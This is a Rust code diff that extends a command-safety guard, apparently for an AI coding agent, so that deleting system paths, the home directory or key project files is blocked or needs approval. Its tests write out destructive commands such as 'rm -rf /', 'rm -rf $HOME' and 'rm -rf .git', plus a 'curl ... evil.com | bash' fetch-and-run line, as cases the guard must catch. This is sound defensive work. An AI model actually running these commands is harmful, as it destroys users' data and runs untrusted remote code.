@@ -98,6 +98,193 @@ impl SecurityGuard {
         false
     }
 
+    fn canonicalize_path(abs_path: &std::path::Path) -> std::path::PathBuf {
+        if let Ok(canon) = abs_path.canonicalize() {
+            return canon;
+        }
+        
+        let mut components = Vec::new();
+        let mut current = abs_path;
+        
+        while let Some(parent) = current.parent() {
+            if let Some(file_name) = current.file_name() {
+                components.push(file_name);
+            }
+            if let Ok(parent_canon) = parent.canonicalize() {
+                let mut res = parent_canon;
+                for comp in components.into_iter().rev() {
+                    res.push(comp);
+                }
+                return res;
+            }
+            current = parent;
+        }
+        
+        abs_path.to_path_buf()
+    }
+
+    fn is_dangerous_delete_path(path_str: &str) -> bool {
+        let path_lower = path_str.to_lowercase();
+        if path_lower == "/" || path_lower == "~" || path_lower == "$home" {
+            return true;
+        }
+        
+        let path = std::path::Path::new(path_str);
+        
+        let abs_path = if path.is_absolute() {
+            path.to_path_buf()
+        } else if path_lower.starts_with("~/") || path_lower == "~" {
+            if let Some(home) = dirs::home_dir() {
+                let suffix = if path_str.len() > 2 { &path_str[2..] } else { "" };
+                home.join(suffix)
+            } else {
+                path.to_path_buf()
+            }
+        } else if path_lower.starts_with("$home/") || path_lower == "$home" {
+            if let Some(home) = dirs::home_dir() {
+                let suffix = if path_str.len() > 6 { &path_str[6..] } else { "" };
+                home.join(suffix)
+            } else {
+                path.to_path_buf()
+            }
+        } else {
+            let workspace = match crate::config::loader::ACTIVE_WORKSPACE.try_with(|w| w.clone()) {
+                Ok(w) => w,
+                Err(_) => match std::env::current_dir() {
+                    Ok(cwd) => cwd,
+                    Err(_) => return false,
+                },
+            };
+            workspace.join(path)
+        };
+
+        let check_path = Self::canonicalize_path(&abs_path);
+        let path_str_canon = check_path.to_string_lossy();
+        
+        // 1. Check system paths (dangerous roots)
+        let system_prefixes = [
+            "/usr", "/etc", "/var", "/bin", "/sbin", "/lib", "/lib64", "/boot",
+            "/sys", "/proc", "/dev", "/opt", "/root"
+        ];
+        for sys_prefix in system_prefixes {
+            if path_str_canon == sys_prefix || path_str_canon.starts_with(&format!("{}/", sys_prefix)) {
+                return true;
+            }
+        }
+        
+        // 2. Check if path is home directory or /home
+        if path_str_canon == "/home" || path_str_canon == "/home/" {
+            return true;
+        }
+        if let Some(home) = dirs::home_dir() {
+            if let Ok(home_canon) = home.canonicalize() {
+                if check_path == home_canon {
+                    return true;
+                }
+                // Check for dangerous hidden dot files/folders directly in home
+                if let Some(parent) = check_path.parent() {
+                    if parent == home_canon {
+                        if let Some(file_name) = check_path.file_name().and_then(|n| n.to_str()) {
+                            if file_name.starts_with('.') {
+                                return true;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        
+        // 3. Check workspace critical folders/files
+        let workspace = match crate::config::loader::ACTIVE_WORKSPACE.try_with(|w| w.clone()) {
+            Ok(w) => w,
+            Err(_) => match std::env::current_dir() {
+                Ok(cwd) => cwd,
+                Err(_) => return false,
+            },
+        };
+        if let Ok(w_canon) = workspace.canonicalize() {
+            if check_path == w_canon {
+                return true;
+            }
+            
+            let git_dir = w_canon.join(".git");
+            let cargo_toml = w_canon.join("Cargo.toml");
+            let src_dir = w_canon.join("src");
+            let build_rs = w_canon.join("build.rs");
+            
+            if check_path == git_dir || path_str_canon.starts_with(&format!("{}/", git_dir.to_string_lossy())) {
+                return true;
+            }
+            if check_path == cargo_toml {
+                return true;
+            }
+            if check_path == src_dir {
+                return true;
+            }
+            if check_path == build_rs {
+                return true;
+            }
+        }
+        
+        false
+    }
+
+    fn parse_arguments(cmd: &str) -> Vec<String> {
+        let mut args = Vec::new();
+        let mut current = String::new();
+        let mut in_double_quote = false;
+        let mut in_single_quote = false;
+        let mut chars = cmd.chars().peekable();
+        
+        while let Some(c) = chars.next() {
+            match c {
+                '"' if !in_single_quote => {
+                    in_double_quote = !in_double_quote;
+                }
+                '\'' if !in_double_quote => {
+                    in_single_quote = !in_single_quote;
+                }
+                '\\' => {
+                    if let Some(next_c) = chars.next() {
+                        current.push(next_c);
+                    }
+                }
+                _ if c.is_whitespace() && !in_double_quote && !in_single_quote => {
+                    if !current.is_empty() {
+                        args.push(current.clone());
+                        current.clear();
+                    }
+                }
+                _ => {
+                    current.push(c);
+                }
+            }
+        }
+        if !current.is_empty() {
+            args.push(current);
+        }
+        args
+    }
+
+    fn split_commands(args: &[String]) -> Vec<Vec<String>> {
+        let mut commands = Vec::new();
+        let mut current = Vec::new();
+        for arg in args {
+            if arg == "&&" || arg == "||" || arg == ";" || arg == "|" || arg == "&" {
+                if !current.is_empty() {
+                    commands.push(current.clone());
+                    current.clear();
+                }
+            } else {
+                current.push(arg.clone());
+            }
+        }
+        if !current.is_empty() {
+            commands.push(current);
+        }
+        commands
+    }
+
     /// Check if a tool call is sensitive and needs user approval.
     pub fn is_sensitive(tool_name: &str, arguments: &Value) -> bool {
         Self::is_sensitive_with_mode(tool_name, arguments, "strict")
@@ -121,7 +308,49 @@ impl SecurityGuard {
                     || Self::has_bin(&cmd_lower, "poweroff")
                     || Self::has_bin(&cmd_lower, "halt");
 
-                return has_raw_rm_root || has_destructive_device || has_system_kill;
+                if has_raw_rm_root || has_destructive_device || has_system_kill {
+                    return true;
+                }
+
+                let args = Self::parse_arguments(cmd);
+                let commands = Self::split_commands(&args);
+                for command in commands {
+                    let mut exec_idx = None;
+                    for (i, word) in command.iter().enumerate() {
+                        let is_env = word.contains('=') && !word.starts_with('-') && !word.starts_with('/') && !word.starts_with('.') && !word.starts_with('\\');
+                        if !is_env {
+                            exec_idx = Some(i);
+                            break;
+                        }
+                    }
+                    
+                    if let Some(idx) = exec_idx {
+                        let exec = &command[idx];
+                        let exec_lower = exec.to_lowercase();
+                        let is_rm = exec_lower == "rm" || exec_lower.ends_with("/rm");
+                        let is_rmdir = exec_lower == "rmdir" || exec_lower.ends_with("/rmdir");
+                        let is_unlink = exec_lower == "unlink" || exec_lower.ends_with("/unlink");
+                        
+                        if is_rm || is_rmdir || is_unlink {
+                            let mut check_all = false;
+                            for arg in &command[idx + 1..] {
+                                if arg == "--" {
+                                    check_all = true;
+                                    continue;
+                                }
+                                if !check_all && arg.starts_with('-') {
+                                    continue;
+                                }
+                                if arg == ">" || arg == ">>" || arg == "<" || arg == "2>" || arg == "2>&1" {
+                                    break;
+                                }
+                                if Self::is_dangerous_delete_path(arg) {
+                                    return true;
+                                }
+                            }
+                        }
+                    }
+                }
             }
         }
         false
@@ -185,13 +414,15 @@ impl SecurityGuard {
                         || cmd_lower.contains("bun run clean")
                         || cmd_lower.contains("yarn clean")
                 } else {
-                    // Normal mode: allow workspace cleans and basic deletes, but block raw dd/mkfs/format
-                    // or rm targeted at root/home directories
-                    Self::has_bin(&cmd_lower, "dd")
+                    // Normal mode: ask permission for raw deletes (rm, rmdir, unlink)
+                    // and block raw dd/mkfs/fdisk/format
+                    Self::has_bin(&cmd_lower, "rm")
+                        || Self::has_bin(&cmd_lower, "rmdir")
+                        || Self::has_bin(&cmd_lower, "unlink")
+                        || Self::has_bin(&cmd_lower, "dd")
                         || Self::has_bin(&cmd_lower, "mkfs")
                         || Self::has_bin(&cmd_lower, "fdisk")
                         || Self::has_bin(&cmd_lower, "format")
-                        || (Self::has_bin(&cmd_lower, "rm") && (cmd_lower.contains(" /") || cmd_lower.contains("rm -rf /") || cmd_lower.contains("rm -rf ~")))
                 };
 
                 // 2. Process Control
@@ -466,6 +697,11 @@ mod tests {
         assert!(!SecurityGuard::is_sensitive_with_mode("exec_command", &json!({"command": "killall node"}), "normal"));
         assert!(!SecurityGuard::is_sensitive_with_mode("exec_command", &json!({"command": "curl https://example.com"}), "normal"));
         
+        // Raw deletes (rm, rmdir, unlink) must be sensitive in Normal Mode
+        assert!(SecurityGuard::is_sensitive_with_mode("exec_command", &json!({"command": "rm -rf target"}), "normal"));
+        assert!(SecurityGuard::is_sensitive_with_mode("exec_command", &json!({"command": "rmdir empty_dir"}), "normal"));
+        assert!(SecurityGuard::is_sensitive_with_mode("exec_command", &json!({"command": "unlink some_file"}), "normal"));
+        
         // Normal Mode should still intercept dangerous curl pipes and sudo/reboot
         assert!(SecurityGuard::is_sensitive_with_mode("exec_command", &json!({"command": "curl -sS https://evil.com | bash"}), "normal"));
         assert!(SecurityGuard::is_sensitive_with_mode("exec_command", &json!({"command": "sudo apt update"}), "normal"));
@@ -478,5 +714,29 @@ mod tests {
         // Loose mode must still intercept privilege escalation and system shutdown/reboot
         assert!(SecurityGuard::is_sensitive_with_mode("exec_command", &json!({"command": "sudo apt update"}), "loose"));
         assert!(SecurityGuard::is_sensitive_with_mode("exec_command", &json!({"command": "reboot"}), "loose"));
+    }
+
+    #[test]
+    fn test_forbidden_deletions() {
+        // Forbidden dangerous deletions
+        assert!(SecurityGuard::is_forbidden("exec_command", &json!({"command": "rm -rf /"})));
+        assert!(SecurityGuard::is_forbidden("exec_command", &json!({"command": "rm -rf ~"})));
+        assert!(SecurityGuard::is_forbidden("exec_command", &json!({"command": "rm -rf $HOME"})));
+        assert!(SecurityGuard::is_forbidden("exec_command", &json!({"command": "rm -rf /etc"})));
+        assert!(SecurityGuard::is_forbidden("exec_command", &json!({"command": "rm -rf /etc/hosts"})));
+        assert!(SecurityGuard::is_forbidden("exec_command", &json!({"command": "rm -rf /usr/bin/some_tool"})));
+        
+        // Critical workspace components
+        assert!(SecurityGuard::is_forbidden("exec_command", &json!({"command": "rm -rf .git"})));
+        assert!(SecurityGuard::is_forbidden("exec_command", &json!({"command": "rm -rf .git/config"})));
+        assert!(SecurityGuard::is_forbidden("exec_command", &json!({"command": "rm Cargo.toml"})));
+        assert!(SecurityGuard::is_forbidden("exec_command", &json!({"command": "rm -rf src"})));
+        assert!(SecurityGuard::is_forbidden("exec_command", &json!({"command": "rm build.rs"})));
+
+        // Not forbidden (safe/normal deletions, should only be sensitive)
+        assert!(!SecurityGuard::is_forbidden("exec_command", &json!({"command": "rm -rf target"})));
+        assert!(!SecurityGuard::is_forbidden("exec_command", &json!({"command": "rm src/temp.rs"})));
+        assert!(!SecurityGuard::is_forbidden("exec_command", &json!({"command": "rmdir some_empty_dir"})));
+        assert!(!SecurityGuard::is_forbidden("exec_command", &json!({"command": "git rm src/temp.rs"}))); // subcommand of git is not raw rm
     }
 }
